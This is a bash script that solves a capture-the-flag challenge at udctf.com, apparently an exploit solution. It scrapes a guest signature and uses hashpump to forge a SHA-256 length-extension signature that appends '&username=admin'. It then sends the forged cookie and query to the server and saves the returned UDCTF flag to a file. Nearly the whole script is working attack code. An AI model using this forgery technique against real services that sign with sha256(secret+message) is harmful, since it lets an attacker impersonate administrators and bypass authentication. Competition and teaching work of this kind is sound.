echo 'inspecting stie...\n'
echo 'curl -s http://udctf.com:5001/\?username\=guest | html2text'
curl -s http://udctf.com:5001/\?username\=guest | html2text

echo '\nsaving signature...\n'
hash=$(curl -s http://udctf.com:5001/\?username\=guest | html2text | grep -e "[0-9a-f]\{32\}")

echo '\nsha256(secret + query)\n'
echo 'using "username=guest" as known query and $hash as known signature'
echo 'padding bits by appending to known data to produce new cycled hash\n'
echo "hashpump -s $hash --data 'username=guest' -a '&username=admin' -k 8"
hashpump -s $hash --data 'username=guest' -a '&username=admin' -k 8

echo '\nextracting payload data (signature) and (parameters + pading)'
IFS=$'\n' payload=($(hashpump -s $hash --data 'username=guest' -a '&username=admin' -k 8))
sign="signature="
sign+="${payload[0]}"
echo "$sign"
rawparams="${payload[1]}"
encparams="${rawparams//\\x/%}"
echo $encparams

echo '\ninjecting payload...'
echo 'curl -sL -b $sign --url http://udctf.com:5001/\?$encparams | html2text -ascii'
curl -sL -b $sign --url http://udctf.com:5001/\?$encparams | html2text -ascii

echo '\nRetreiving FLAG...'
echo "curl -sL -b $sign --url http://udctf.com:5001/\?$encparams | html2text -ascii | grep --color=auto -a -E 'UDCTF{.*?}'\n\n"
curl -sL -b $sign --url http://udctf.com:5001/\?$encparams | html2text -ascii | grep --color=auto -a -E 'UDCTF{.*?}'
flag=$(curl -sL -b $sign --url http://udctf.com:5001/\?$encparams | html2text -ascii | grep --color=auto -a -E 'UDCTF{.*?}')
echo "$flag" > flag.txt
echo '\n'

